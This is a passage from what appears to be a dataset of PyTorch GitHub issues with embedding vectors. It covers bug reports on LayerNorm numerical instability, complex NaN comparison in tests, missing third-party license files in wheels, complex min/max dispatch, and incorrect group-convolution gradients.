 -4.75729220e-02 -3.04242343e-01 -3.08486193e-01  2.13579163e-01
 -1.95104405e-01 -1.59516290e-01  5.40310889e-02 -5.74893989e-02
  2.30296329e-02  3.40389162e-02 -9.33463126e-02  3.46619040e-02
 -2.58200109e-01  4.43358958e-01 -4.91944328e-02 -2.03217119e-01
 -1.60922110e-01 -1.49976641e-01  2.80528039e-01 -2.91616082e-01
 -8.32649767e-02  2.13934425e-02  4.70600396e-01  2.93534935e-01
  2.15684157e-03 -2.89638698e-01 -2.52263993e-01 -1.84097126e-01
  1.47703141e-01  9.31416526e-02  2.13960260e-01  3.73125911e-01
  8.44802335e-02 -2.31440645e-03  2.04020560e-01  1.67285591e-01
 -1.02489650e-01 -1.46374673e-01 -2.84552157e-01 -3.76641527e-02
 -1.41016394e-01 -1.34884361e-02  1.77240878e-01  2.42537484e-02
  2.58879185e-01  1.72833800e-01 -6.28468618e-02 -5.73747233e-02
 -2.16622368e-01  1.30670696e-01  6.98611498e-01 -1.58702403e-01
  2.23796397e-01 -2.78957218e-01 -2.11452335e-01 -6.01915717e-02
  2.63128579e-01  4.76484895e-02 -1.12674415e-01 -5.81473485e-02]"
LayerNorm does not behave as documented high priority module: numerical-stability module: nn triaged module: correctness (silent) module: norms and normalization,"## ðŸ› Bug

torch.nn.LayerNorm does not behave as documented. It fails for me especially for highly biased/mean-shifted layers. I can't figure out where this instability yields from as it occurs even for weakly mean-shifted layers:

## To Reproduce
Steps to reproduce the behavior:
```
n = torch.nn.LayerNorm(4, eps=1e-5, elementwise_affine=False)
a = torch.randn(5, 4) + 2000  # create random tensor with N=5, L/C=4 and mean=2000, var=1
[[torch.mean(i), torch.var(i, unbiased=False)] for i in n(a)]  # should be near [0, 1]
```
gives:
```
Out[255]: 
[[tensor(0.0002), tensor(0.2006)],
 [tensor(0.0002), tensor(0.1634)],
 [tensor(0.0625), tensor(30822.9492)],
 [tensor(0.0001), tensor(0.0491)],
 [tensor(-0.2500), tensor(48425.8438)]]
```

## Expected behavior
```
def expected_LayerNorm(single_layer1d, eps):
    c = single_layer1d
    return (c - torch.mean(c)) / (torch.sqrt(torch.var(c, unbiased=False).add(eps)))

# comparison for one sample of a
print(n(a[2, :]))
print(expected_LayerNorm(a[2, :], 1e-5))
```
gives:
```
tensor([  22.0000,   72.7500, -285.0000,  190.5000])
tensor([ 0.1249,  0.4133, -1.6235,  1.0852])
```

## Environment
1.7.1+cpu (pip)
Win10


cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @albanD @mruberry",True,"[-0.60162175 -0.07599896  0.04620573 -0.05516296 -0.1138816  -0.05858513
 -0.42076874 -0.02411546 -0.4103143   0.17839058  0.09397046  0.04238376
  0.06064395  0.10568543 -0.19571078  0.36038643 -0.2993825  -0.09951141
 -0.01042707  0.15609837  0.31046736  0.03403887 -0.02139074 -0.18044174
  0.15728012 -0.14756158  0.06700055 -0.19903205  0.6128531  -0.38550103
 -0.19629662 -0.03128926 -0.44746605  0.02934042 -0.07483454  0.13229133
 -0.27219376 -0.28937763 -0.24073589  0.12953144  0.08639878  0.28999665
 -0.05523561 -0.15381327  0.0095305  -0.00535598 -0.01338993  0.14920647
 -0.25752997 -0.13094464  0.01861826  0.22293276 -0.14486319 -0.14059371
  0.09604239 -0.06916898 -0.12492499  0.11584891 -0.08721263 -0.19344255
  0.34524018 -0.19261155 -0.41330913 -0.13623686  0.33490312  0.18979608
  0.19184452  0.05202071  0.24784236  0.22091806  0.06289896  0.1457324
 -0.18810621 -0.17153296  0.17218433  0.00473718 -0.1647192   0.12460129
  0.03432705 -0.06120112  0.15450388 -0.01100913 -0.02694245 -0.17160168
 -0.03697959 -0.04497052  0.1798273  -0.23581912  0.05782292  0.22565712
  0.17669824  0.00479592 -0.24811581  0.25771517  0.14692537  0.10122855
  0.00221971 -0.02704678 -0.02913375 -0.02933791  0.208556   -0.3838789
 -0.5306651   0.37371874  0.03874506 -0.10505854  0.32889658 -0.04865143
 -0.01119026  0.29590952  0.14466326  0.10599971 -0.21667661 -0.43439582
  0.08094825 -0.04090457  0.05239104  0.12427301 -0.3971184   0.26973677
  0.04534824 -0.01582083 -0.05516921  0.07008173  0.36001253  0.17227927
  0.04543724 -0.05308671 -0.04293068 -0.03766888  0.02481544  0.34542462
 -0.03746109 -0.01054263  0.35348094  0.41890314 -0.18998    -0.09589078
 -0.33507138  0.1372155  -0.3878105   0.20010243 -0.2875444  -0.28434587
  0.35897416 -0.04217796 -0.2149384   0.06716345  0.07361855 -0.17118189
  0.05724948 -0.09214645 -0.43304247 -0.00352692  0.23227778  0.09864039
 -0.1996049   0.01273879  0.36055717 -0.24331054  0.13439447  0.21402572
  0.18530278  0.2117199   0.2085499   0.0111552  -0.18044542 -0.2048569
 -0.20755577 -0.0050236  -0.20798321  0.0941284   0.15851474 -0.08367671
  0.48676935 -0.2683158  -0.3183311  -0.39624405  0.0109298   0.29211155
  0.02509077  0.08147734  0.23816323 -0.06425478  0.05806316  0.03668675
  0.1167704   0.1801039  -0.15599248 -0.04485099 -0.3413543  -0.24253109
  0.04984738  0.14759791  0.2505248  -0.20808253  0.03224327 -0.10141402
 -0.07203648 -0.07840632  0.06986502  0.06296358  0.0915177   0.19146754
 -0.20670737  0.00160772 -0.14872625 -0.21389464 -0.2913965   0.18517993
 -0.2504947  -0.4779489  -0.17722058 -0.2549401  -0.04052863  0.45406276
  0.20418751  0.09058532  0.17407756  0.06756586  0.47829694 -0.08277765
  0.06515947 -0.2032812   0.08719841 -0.01367075 -0.12577854  0.02431861
 -0.16620062  0.07583396 -0.158036   -0.08169037  0.0392202  -0.00694665
  0.14302     0.17240557  0.17913847  0.29250276 -0.07953465 -0.01461834
 -0.3288722   0.00330151  0.11945593 -0.25122392 -0.15127866 -0.01061716
 -0.20366323 -0.06747694 -0.12708455  0.30606174 -0.42148295  0.06960709
  0.39018694  0.10745426  0.08313793 -0.03036369 -0.03473902 -0.10257042
 -0.01000555  0.348473    0.2607695   0.4140039  -0.11978103  0.15690586
  0.01619281 -0.04203617 -0.12880304  0.06400471  0.02902397 -0.20836289
  0.21627954 -0.54411983  0.06841775  0.02937857  0.12852146  0.00567398
  0.3823065  -0.11262909 -0.04319122  0.16844812 -0.47175974  0.22431886
  0.10189719  0.32953012  0.3446491  -0.3556975  -0.20350122 -0.24727798
  0.05766402 -0.2503666   0.06132884  0.05333674  0.42644972  0.03276469
 -0.10042598  0.21031135  0.27475148 -0.3296262  -0.01159534 -0.29102534
  0.03747547  0.16550536  0.11715185  0.04255138 -0.26413727  0.0577074
  0.07504326  0.02384118  0.18797664 -0.31793386  0.8178731  -0.04139307
 -0.23833704  0.26580772 -0.10170794  0.03655687 -0.02629752  0.06927479
  0.11047836  0.00807199  0.03466198 -0.21094352 -0.08167037 -0.1155441
  0.07388647 -0.04236488 -0.10610822 -0.09881943 -0.03513389  0.11271025
  0.14010158  0.00805804  0.22911695  0.06160396  0.16204207  0.05256193
 -0.4646958   0.4405952  -0.16203475 -0.2585079  -0.03757414  0.08059809
  0.09143552 -0.14793164 -0.01540902 -0.01119277  0.11253342  0.21990478
  0.12328814  0.15798885  0.05603065 -0.02427791 -0.22351536 -0.07654257
 -0.29715833  0.3784802  -0.00585714 -0.05160063  0.02335515  0.25564712
 -0.10986412  0.19516401 -0.03821375  0.01944493  0.1282753   0.09135205
  0.24775562 -0.07620665  0.00339653  0.24345908  0.15580703  0.10810599
 -0.11958034  0.3016231   0.14420217 -0.24917158 -0.02605034 -0.07049919
  0.07352351  0.19634485 -0.2988059   0.15261683 -0.23155157 -0.30740604]"
nan comparision for complex numbers feature triaged module: complex module: testing,"Currently, the complex number comparison is done by comparing real and imaginary separately. This is not always correct, because, for example, for `x = -inf+nanj`, on CUDA 11.2, `asin(x) = nan-infj` and on gcc 10.2, `asin(x) = nan+infj`. They are both correct and I don't think one is more correct than the other. However, this way of comparing causes two test failures on my machine:
```
FAILED test/test_unary_ufuncs.py::TestUnaryUfuncsCUDA::test_reference_numerics_asin_cuda_complex128 - AssertionError: False is not true : Scalars failed to compare as equal! Comparing the imaginary part -inf and inf gives a difference of inf, but the allowed difference...
FAILED test/test_unary_ufuncs.py::TestUnaryUfuncsCUDA::test_reference_numerics_asin_cuda_complex64 - AssertionError: False is not true : Scalars failed to compare as equal! Comparing the imaginary part -inf and inf gives a difference of inf, but the allowed difference ...
```

In https://github.com/pytorch/pytorch/pull/50550, I relaxed the nan comparison at `test_unary_ufuncs.py` to
> as long as any of the real or imag is nan, then the whole number is considered as nan and considered as equal. That is `nan + 2j == 3 + nan j`.

However, as @ngimel pointed out in https://github.com/pytorch/pytorch/pull/50550#issuecomment-761905289, this is too relaxed  to make the whole `test_unary_ufuncs.py` compare `nan`s in the relaxed mode. So we need a more detailed plan about relaxed comparison and where should it be used. And this issue is for the purpose of this discussion.

cc: @mruberry 

cc @ezyang @anjali411 @dylanbespalko @mruberry",True,"[-0.47150567  0.00604374 -0.2500953  -0.12885515 -0.2767232  -0.39224824
 -0.13915549  0.27900907 -0.18626505 -0.26696032  0.0710308  -0.07400092
 -0.0296994   0.22937551 -0.07059108 -0.37311435 -0.18102176 -0.08996475
 -0.29683042  0.2366445  -0.26201874  0.06862824 -0.02579671  0.12248625
  0.22086349 -0.04583292  0.3615566   0.13989903  0.22566205 -0.07037862
  0.15896389  0.51310873 -0.2556473   0.05113161 -0.32331055  0.0398624
 -0.3226812  -0.10388578  0.05209899  0.0785155   0.01314105  0.08534932
  0.329399    0.03539435  0.13195229  0.16842717 -0.26684913  0.15664914
  0.0416563   0.0881467  -0.02914258  0.06882006  0.12697342 -0.17752789
  0.05027113 -0.23150861 -0.0401479  -0.2504756  -0.09500624 -0.03872351
  0.25795248 -0.11649336  0.17825308 -0.03710707  0.43571606 -0.07517159
  0.23525214 -0.49429542  0.13846475  0.14180177  0.30029044  0.21418889
 -0.35008866 -0.10144097 -0.24275744 -0.06373106 -0.1962469  -0.00979934
  0.0245782   0.0971309   0.07060666  0.02719392  0.02912308 -0.2556038
  0.09360693 -0.24444143  0.2534331  -0.05446215  0.19336975  0.05315928
  0.19446382  0.19314207 -0.25620833  0.00974529  0.14244437  0.05709979
  0.34013164  0.08886145 -0.0258661  -0.02981355 -0.3858429  -0.206626
 -0.2581352  -0.12868638  0.04701462 -0.14626744  0.05248013 -0.14203596
  0.3220424  -0.03867941  0.17027059 -0.05610114 -0.19683245 -0.03563503
 -0.15544668  0.0131267   0.06958767  0.03963323  0.0570091   0.20561677
 -0.27400017 -0.19216812  0.13683559  0.12173612  0.03453229  0.09810904
 -0.19394484 -0.10997507 -0.25332785 -0.22397125  0.3423619  -0.00545431
 -0.33994108  0.08701286 -0.14929745  0.14141083  0.01023952 -0.1351032
 -0.4455889   0.15260765 -0.15194385  0.01887149 -0.21912587  0.01825893
  0.18752396 -0.42255086 -0.34437406  0.02260008  0.20980383 -0.01778334
  0.09192378  0.13421836  0.15275373  0.13363966  0.30157876 -0.10078621
  0.09471954 -0.07266425  0.09417453 -0.2786881   0.11082089  0.40384167
  0.2327446   0.29502046  0.30189234  0.1955722  -0.14318128 -0.16022322
 -0.22361968  0.1865671  -0.18228796 -0.0267741   0.10181022  0.17589998
  0.34888637 -0.290946   -0.37693268 -0.12979457 -0.124726    0.39410037
 -0.06890914  0.02162746  0.24972641 -0.07326265  0.22868496  0.2285397
  0.06683815  0.388973   -0.36722678  0.03611343 -0.43369147 -0.22551455
 -0.2557279   0.09424971  0.30352667 -0.41319478  0.46169394 -0.03077816
  0.19390762  0.02686876 -0.34860152 -0.0730114   0.02899401 -0.3174141
 -0.21055578 -0.25457788 -0.12962118  0.07381068 -0.21436945  0.45841223
 -0.08879925  0.0236016  -0.42233145 -0.09481934 -0.14734581  0.17713766
  0.18857002 -0.35952526  0.2057696   0.5450118   0.18907115 -0.35686025
  0.4169705  -0.13432878 -0.2529941  -0.12317601  0.03737267  0.03410854
 -0.2658775  -0.21019328  0.3157843  -0.2541067   0.2313373  -0.22957066
  0.07678211 -0.09596059 -0.03596731 -0.09092236  0.21391428 -0.15502389
 -0.3565495  -0.16538599  0.23355149  0.01138284  0.3182847   0.422257
 -0.04286832 -0.09360471  0.03597938  0.1569775  -0.23683056 -0.16236985
  0.14522418 -0.12343006 -0.02053163 -0.2885357   0.15745583  0.20013356
  0.12277713 -0.08498344  0.3833007   0.0949124  -0.02830257  0.139697
  0.08082603  0.05019576 -0.24190755  0.11483262 -0.14691195  0.11736459
  0.05916061  0.04832372  0.49971044 -0.24859722  0.14808674 -0.04305048
  0.25876024 -0.17662817 -0.22494    -0.14291427  0.09614146 -0.06753746
 -0.01426319  0.5029859   0.12898949 -0.5387316   0.29262143  0.11424411
 -0.28057563 -0.02014731 -0.11117233  0.03621152  0.38053328 -0.16032965
  0.08703127  0.0907779   0.1204524  -0.2819161  -0.07971593 -0.05461318
 -0.24895597  0.33284473  0.38066825 -0.2742604  -0.12331188 -0.06653355
  0.15819252  0.21878208  0.01830734  0.07925915  0.27052894 -0.19948524
 -0.35336635  0.42306757 -0.22815916  0.2089825  -0.11624329  0.3394133
  0.04213738  0.17562312 -0.06280866 -0.24972363 -0.2838322  -0.21223587
  0.18729626 -0.00257302 -0.3671934  -0.0379885   0.09203373  0.47451955
  0.23561895  0.06955571 -0.1486049   0.13410881  0.25147086 -0.01775997
 -0.17602274  0.08673751  0.17346348  0.08284967 -0.16285646 -0.10695529
 -0.19376995 -0.16169922 -0.21313685  0.26188087 -0.00130356  0.51791245
  0.07355654 -0.20980218 -0.05729107  0.25067538 -0.34992883 -0.04657074
  0.19385013  0.16546798  0.07116912  0.20423317  0.2390512  -0.10298157
  0.02198754 -0.2094887  -0.363869    0.1498153   0.07043141 -0.18074651
  0.25282127 -0.1451889   0.12269597 -0.11249869 -0.24638703  0.15244743
 -0.01070526  0.05910488  0.42606434 -0.3480195  -0.13509937 -0.20143798
 -0.19365236  0.22877851  0.27635533 -0.09194825 -0.00189238  0.02008456]"
License file in wheels and conda packages does not contain any third-party licenses high priority module: binaries triaged,"## ðŸ› Bug

License files for relevant code that's used or linked to must be distributed with binaries. There are many license files in `third_party` that must be distributed together with any source or binary distribution.

This was noticed by the conda-forge team in https://github.com/conda-forge/pytorch-cpu-feedstock/issues/34

## To Reproduce

Steps to reproduce the behavior:

1. Download a wheel from, e.g., https://pypi.org/project/torch/1.7.1/#files
2. Unpack it (it's just a zipfile)
3. Inspect the license file in the `torch-1.7.0.dist-info` directory - it's only a copy of https://github.com/pytorch/pytorch/blob/master/LICENSE. No other license files (there are many in `third_party/` are mentioned or present anywhere in the package.


## Expected behavior

The correct way of dealing with this is normally:

- Keep the main `LICENSE` file in the root of the repo unchanged (the default license for new code contributed to the project).
- Keep a separate list of license files present in the repo, in a script or metadata file
- At build time - for any sdist, wheel or conda package - concatenate all those license files together into a single `LICENSE` file. If desired separating the main license from the rest with a _""licenses for bundled code""_ section header.
- Insert that generated license file in the artifacts.

Also, given how often dependencies get added or changed in `third_party`, add some kind of a check that all files named `LICENSE`, `LICENSE.*` or `COPYING` are actually included.



cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @seemethere @malfet @walterddr",True,"[-2.45631009e-01 -3.78429592e-01 -4.58810449e-01 -3.71368587e-01
  1.46493554e-01 -5.80207817e-02 -6.83647245e-02 -3.75921950e-02
 -2.75019556e-01  6.41708225e-02 -4.89873365e-02  2.63648510e-01
  3.69592726e-01  1.13459595e-01 -1.62884861e-01  3.29962134e-01
 -1.15563139e-01 -1.53272614e-01 -1.45041049e-02  1.13870256e-01
  6.04905188e-04  1.75660610e-01 -7.60776326e-02  9.83019024e-02
 -2.23993629e-01  4.05976996e-02 -1.59606308e-01  1.25438452e-01
  7.50358850e-02 -2.40580395e-01 -7.37595558e-02  6.11050487e-01
 -1.51225179e-01  2.93409348e-01  3.48590836e-02 -2.39363089e-01
 -2.04578266e-01 -4.90902901e-01  3.13112810e-02 -2.07904696e-01
  7.49329478e-02 -2.16150552e-01 -3.20601106e-01  9.27531719e-02
 -3.75274897e-01  1.46161124e-01  3.12394369e-03  3.44997287e-01
 -3.02776456e-01 -9.85252559e-02 -1.75959304e-01  1.40533984e-01
  6.24993145e-02 -1.70675337e-01  1.64425001e-03 -3.72416526e-01
  1.77174807e-02  2.68294394e-01 -4.12066095e-03  1.69828415e-01
  2.08723962e-01 -1.58274472e-01  1.70369260e-02 -4.22727838e-02
 -5.29638771e-03  1.87082991e-01  1.70728005e-02 -2.40227114e-02
  8.29101950e-02  2.04482116e-03  1.96793437e-01 -1.09886989e-01
 -2.52459645e-01 -6.62906915e-02  1.49320692e-01 -1.64149404e-01
 -1.48000211e-01  9.89641100e-02 -2.85851985e-01 -3.62614483e-01
 -4.09108967e-01  2.64690369e-01  9.53239016e-03 -1.03370160e-01
  7.75770247e-02 -3.42898697e-01  6.76725656e-02  1.53237745e-01
 -1.24869563e-01  3.80579121e-02  2.97682285e-02 -8.00035447e-02
  4.15508866e-01  2.55307317e-01 -1.27867639e-01  3.70593548e-01
  2.11798906e-01 -1.69058383e-01  3.95320356e-04 -2.24828869e-01
  6.30047619e-02  4.61324528e-02 -2.92339206e-01 -9.02172327e-02
 -1.03580281e-02  4.11421098e-02  4.90686864e-01  1.92722559e-01
 -1.23436727e-01 -6.48283809e-02  1.95327789e-01  1.43906385e-01
  3.79612781e-02 -3.01137328e-01 -3.45635593e-01  3.82452279e-01
 -3.19866449e-01 -1.50568914e-02  1.82575613e-01 -1.13048732e-01
 -1.20089337e-01 -1.20563813e-01  3.59675735e-02 -1.88385509e-02
  4.95765001e-01  7.63716847e-02  5.75502962e-03 -3.36527005e-02
 -4.31375772e-01 -2.59918980e-02 -8.11798498e-02  2.83811897e-01
  2.70183295e-01 -5.67641333e-02  1.15779445e-01  5.83485439e-02
 -3.81882727e-01  6.74042180e-02  1.25142168e-02  1.03011817e-01
 -2.06366614e-01 -2.80058719e-02  1.72962397e-01  1.82825148e-01
 -2.98039794e-01  1.34891808e-01 -1.52023494e-01  2.23312661e-01
  4.00147349e-01 -1.45247906e-01  5.15496321e-02 -5.11451140e-02
 -1.74295694e-01  3.83647025e-01  1.73519254e-01  1.80472225e-01
  7.56349444e-01  3.90773304e-02  1.33402884e-01 -1.17788397e-01
  8.58301669e-03  1.76917225e-01 -2.99059898e-01  3.23187977e-01
 -5.28908491e-01  7.86972195e-02 -2.01633126e-01 -3.45741510e-02
 -1.63549423e-01 -1.49863422e-01  1.33033514e-01 -3.81519288e-01
 -1.67360723e-01 -3.43928672e-02  2.60045707e-01  2.81215850e-02
 -2.73992196e-02 -6.08322397e-02  1.27512068e-01  6.18723258e-02
  2.14349329e-01  1.43223688e-01  1.23613328e-01  2.43496478e-01
 -1.48776770e-02  8.85944888e-02  1.07226528e-01  2.24606860e-02
 -4.40411031e-01 -1.36566997e-01 -3.77213895e-01  3.00855577e-01
  2.47402698e-01 -3.19050252e-01 -2.29317993e-01 -2.75613844e-01
  3.62882078e-01  2.36350402e-01  3.43863666e-01 -1.44906402e-01
  8.58226791e-04  3.13503504e-01  4.43873089e-03  7.65582472e-02
 -9.76850614e-02 -1.46163315e-01 -1.00696906e-01 -1.44646168e-01
 -3.63388658e-01  8.71064514e-02 -2.75742352e-01 -2.61654258e-01
  1.50578797e-01 -2.22925335e-01 -1.40775606e-01  1.22076012e-01
 -1.95813149e-01 -1.84507281e-01  1.74023539e-01  8.52928907e-02
  4.06769961e-02 -6.39365166e-02  2.60700554e-01 -1.96137816e-01
 -3.14720348e-03  1.30783439e-01  3.83866012e-01 -1.39499418e-02
  1.17516667e-01  2.67232388e-01 -6.09179214e-02 -3.55160415e-01
  7.71547854e-02  1.19064629e-01 -6.62927851e-02  3.75726223e-02
  1.18796639e-02  3.15260813e-02  4.82573174e-03  5.33408001e-02
  2.05270216e-01  2.81620100e-02  1.83432788e-01 -5.43122813e-02
  1.55499637e-01  1.01315379e-01 -6.96136355e-02  3.12271684e-01
 -1.95300862e-01  1.38649903e-02 -1.56566441e-01 -2.67344594e-01
  2.72603333e-01  1.31699145e-01  2.03800187e-01 -2.21227437e-01
 -1.48512498e-01 -1.80845886e-01  1.41879052e-01 -2.42732510e-01
  2.20112093e-02  2.79573619e-01 -2.71364391e-01  8.73768628e-02
  1.10175069e-02  6.77041039e-02 -1.67467922e-01  2.67545968e-01
 -2.38749206e-01 -9.38107669e-02  1.84924155e-01 -1.49751306e-01
  2.57751733e-01  2.03293726e-01  2.35484570e-01  2.42181450e-01
  3.21599185e-01 -3.71720403e-01  1.62160128e-01  2.74187982e-01
  5.34553304e-02  1.55481517e-01  2.23035261e-01  6.01075031e-02
  3.05443048e-01  7.94139784e-03 -3.92409682e-01 -4.01945800e-01
 -2.37930715e-01 -2.30130345e-01 -1.59155324e-01  2.45674998e-02
  1.47098035e-01 -3.32087069e-03 -7.48520195e-02 -3.94956581e-02
  8.10337141e-02 -3.00947070e-01  8.40865970e-02 -1.28828749e-01
 -3.77882235e-02  1.37290373e-01  3.29560757e-01 -2.17296571e-01
 -6.24430180e-03 -8.05200078e-03 -9.23411846e-02  5.23368001e-01
  9.09780860e-02 -2.08421350e-01  2.91927278e-01 -1.53139561e-01
  1.07658722e-01  1.51845843e-01 -2.13975459e-01  2.58119881e-01
 -8.33792314e-02  4.57060814e-01  7.75997639e-02  5.16677126e-02
 -1.28102452e-01 -1.56505913e-01 -3.55348825e-01  2.04784572e-01
  8.44989717e-02  2.61767656e-01 -2.40649357e-01  2.96510160e-01
 -3.85616660e-01  4.38525528e-01  2.52096474e-01 -5.24923354e-02
 -7.46227503e-02  1.99655950e-01 -1.84423476e-01  5.34368604e-02
 -6.44317176e-03  1.80281520e-01 -5.90403005e-02 -1.98013455e-01
  9.75878686e-02  1.66201517e-02  9.25816596e-02  3.72232310e-02
 -2.54207313e-01  1.30267814e-03  1.00949481e-01  4.64542583e-03
  3.16477627e-01 -1.21986702e-01 -1.82661340e-02 -1.40917018e-01
 -2.89675504e-01 -3.01720705e-02 -1.04672730e-01 -6.19118363e-02
 -1.35486228e-02  1.90217167e-01  9.86804813e-02  8.23898166e-02
 -9.49693918e-02  1.50600165e-01 -3.81582350e-01 -3.49931940e-02
 -1.17635168e-02 -1.53788537e-01 -3.55335861e-01 -8.30204859e-02
  7.36369118e-02  2.21731048e-02 -1.71730027e-01 -1.41577244e-01
  4.51694690e-02  1.73283249e-01  7.93695264e-03  1.60608083e-01
 -9.69715118e-02  1.77707821e-01  1.59286395e-01 -1.20228985e-02
 -1.58670217e-01  1.66572034e-01  3.48147899e-01 -1.29998416e-01]"
Complex dispatch should be disabled on min/max functions good first issue triaged module: complex,"As of #36377, min/max functions were disabled for complex inputs (via dtype checks), however, min/max kernels are still compiled and dispatched for complex, see e.g.  
https://github.com/pytorch/pytorch/blob/e44b2b72bd4ccecf9c2f6c18d09c11eff446b5a3/aten/src/ATen/native/cpu/ReduceAllOpsKernel.cpp#L77
This dispatch should be disabled, and we should rely on errors produced by dispatch macro to not run those ops on complex, instead of doing redundant dtype checks. 

cc @ezyang @anjali411 @dylanbespalko @mruberry 
cc @t-vi, thanks for reporting!",True,"[-0.38893193  0.0804546  -0.33921355 -0.09185503 -0.44845766 -0.07509178
  0.08976281  0.1988799  -0.5707649  -0.01545919  0.07320483  0.23110162
 -0.05754664  0.00588703 -0.26557165  0.40115175  0.39037615  0.06939544
 -0.3898755  -0.36560723 -0.2346256   0.01552789 -0.02122839  0.18318965
  0.24247275 -0.1044974  -0.00366825  0.26145846  0.1679989   0.22102495
  0.39677268  0.38062403  0.3125555  -0.06260082 -0.00884941  0.12935296
 -0.03677667 -0.22036889  0.4163807  -0.29350996 -0.05337016  0.29780805
  0.0874102   0.3969755  -0.4332366  -0.04286091 -0.3219751   0.34094632
 -0.25388366 -0.19994606 -0.02088132  0.21745324 -0.17107578 -0.15777683
  0.30195907 -0.34007466  0.28338987  0.18242729  0.03477279  0.19534844
  0.3018361  -0.32014567  0.39940667  0.00430794 -0.039716   -0.13980098
  0.22878881 -0.36070043  0.20552209  0.31514838 -0.02289021 -0.25514194
 -0.44744298 -0.3754385  -0.08393238  0.05658687 -0.34297162 -0.27473015
  0.06770386  0.19626328  0.1232199   0.09749167  0.2892583  -0.20808885
 -0.12544161 -0.13863735  0.30280206  0.09623767  0.49538553 -0.16177078
  0.37958828  0.04431786  0.03742022  0.07776796 -0.02213764  0.21483895
  0.40674156 -0.145317   -0.5917763  -0.1330329   0.05304022 -0.49416554
 -0.7602256  -0.01040507  0.02375387  0.11575095 -0.06741363 -0.09144256
  0.05045044  0.04643347  0.34922868  0.19954355 -0.1526575   0.3224621
  0.05329389  0.21986492  0.32297134  0.25867942  0.11023052  0.17054175
 -0.0827821  -0.30748367 -0.29463944 -0.02040486  0.368039   -0.0245789
  0.09651863  0.1274991   0.12477674 -0.1157499  -0.1355916   0.3133716
  0.08874416 -0.01215908  0.12733907  0.02478345 -0.04511435 -0.01711731
 -0.40004593 -0.05957085 -0.04209436  0.37095258 -0.07183275 -0.21539386
  0.11691795  0.02683667 -0.41535932  0.17800453  0.22474827  0.02479285
  0.04768641 -0.0831483  -0.02853941  0.25964165  0.15044254  0.16963649
  0.34354895 -0.02681093 -0.10209166 -0.39763254  0.03915823  0.42111388
  0.12042615  0.24790014 -0.04900572 -0.07706173 -0.3500498  -0.16627105
 -0.37605095  0.35597926 -0.7073426  -0.37678048  0.03010514 -0.15009049
 -0.06523405 -0.00268659 -0.24315704 -0.3021009   0.04049736  0.43490523
  0.16647625 -0.15485546  0.312073   -0.05287626  0.09949562  0.42645705
  0.70006746  0.34976307 -0.5175709  -0.48595336 -0.56461596 -0.0502435
  0.29382265 -0.0772263  -0.12615675 -0.21642494  0.16765836  0.39510518
  0.45673358  0.13258311  0.04979885  0.22273377  0.13846245  0.22931424
  0.11716808 -0.06609138 -0.36853883 -0.24062891  0.07595824  0.30309606
 -0.3245695  -0.11949959  0.09719965 -0.4242221  -0.32451802  0.45126483
 -0.1585233   0.29468203 -0.03690806  0.18502685  0.23294845 -0.35255623
  0.00310497 -0.31985807 -0.26676786 -0.2584512  -0.318873    0.06029322
 -0.00876675  0.02188253 -0.49465144 -0.40292606  0.24254745 -0.11474569
 -0.0330313   0.05248046 -0.29285237 -0.20894054  0.36017543  0.24964918
 -0.28376934 -0.45378822 -0.05758029  0.11196798  0.27961195  0.44282234
 -0.47767258  0.4859794   0.00325173  0.2748182  -0.37034318 -0.35764548
 -0.19883245  0.16418386 -0.13690676 -0.2144192   0.17278793  0.39120984
  0.39407688 -0.29659536  0.1452041   0.29627252 -0.06595542  0.5661051
  0.12168796  0.2438986  -0.11739883  0.49655858 -0.12985048 -0.35710925
 -0.07421269 -0.3785532   0.25405467 -0.05438519  0.29807413 -0.30812162
  0.25132203  0.03997957 -0.22439736  0.21773286 -0.02896077  0.02068825
  0.2595762   0.18291184 -0.18911308 -0.6623855   0.07354622 -0.25175226
 -0.23756994  0.04649568 -0.24170859 -0.15290429  0.24636717 -0.10879385
 -0.16731219  0.48342204  0.02345684 -0.24877101  0.0390849   0.12594876
 -0.06227393  0.35269162 -0.18395849  0.09450449 -0.22342908  0.128482
 -0.17348826 -0.00326259  0.3958356  -0.3181783  -0.10937094  0.23457523
  0.15278234  0.05048549 -0.11582246  0.22991878 -0.2589844   0.09871595
 -0.08246019  0.12501734 -0.01831718 -0.27165583 -0.47593775  0.26130134
  0.31016356  0.02467852 -0.36881855 -0.11467032  0.06341226  0.33793095
  0.4584416   0.07997181 -0.27630544 -0.14251345  0.2671861   0.00459347
  0.08494012 -0.05658102 -0.01531305 -0.16340882  0.13821334 -0.12859708
  0.06666263  0.11048882 -0.32082343 -0.19822058  0.16910201  0.26527005
  0.02669356 -0.14595267  0.05028147  0.06607539 -0.40579098  0.14545122
  0.10586214  0.2070825   0.48621327  0.27469996  0.00605827  0.3053513
 -0.48974663 -0.10713704 -0.5187359   0.03929837  0.03306543 -0.33733976
 -0.14396112 -0.16873643 -0.33742666 -0.0688957  -0.16083093  0.47065562
 -0.09068895  0.60565865  0.24280748 -0.22888643  0.02305468 -0.39938897
 -0.3381058  -0.17666861  0.20037554  0.31409597  0.0912916  -0.03767069]"
[group conv backward] wrong value calculated high priority module: dependency bug module: nn module: convolution triaged module: correctness (silent),"## ðŸ› Bug


group convolution backward path result is not correct.
This happens with specific combination of input only
if input and output channels are 24 and groups = 24
stride = 2 and padding = 1

As mentioned below if you change group_val to 25 or 23 , backward path output is correct. only with 24 it's gives wrong results.
Here grad_in is initialized to 1 hence output of backward path will be equal to forward path.



Steps to reproduce the behavior:
```
import torch
group_val = 24
ifm = torch.ones([1, group_val, 6, 6], dtype=torch.float32)
weights = torch.ones([group_val, 1, 3, 3], dtype=torch.float32)
op = torch.nn.Conv2d(
        in_channels=group_val,
        out_channels=group_val,
        kernel_size=[3,3],
        stride=[2,2],
        padding=[1,1],
        dilation=[1,1],
        groups=group_val,
        bias=False,
        padding_mode='zeros'
    )

op.weight.data = weights
res = op(ifm)
print(res)
grad_in = torch.ones(res.shape, dtype=torch.float32)
res.backward(grad_in)
print(op.weight.grad)
```

## Result (adding only 1 channel result as other's are same only):
tensor([[[[4., 6., 6.],
          [6., 9., 9.],
          [4., 6., 6.]]],


## Expected behavior
Tensor([[[[4., 6., 6.],
          [6., 9., 9.],
          [6., 9., 9.]]],



 - PyTorch Version (e.g., 1.0): 1.7.1
 - OS (e.g., Linux): Linux
 - How you installed PyTorch (`conda`, `pip`, source): pip
 - Build command you used (if compiling from source): NA
 - Python version: 3.6.8
 - CUDA/cuDNN version: cpu
 - GPU models and configuration: na
 - Any other relevant information: na


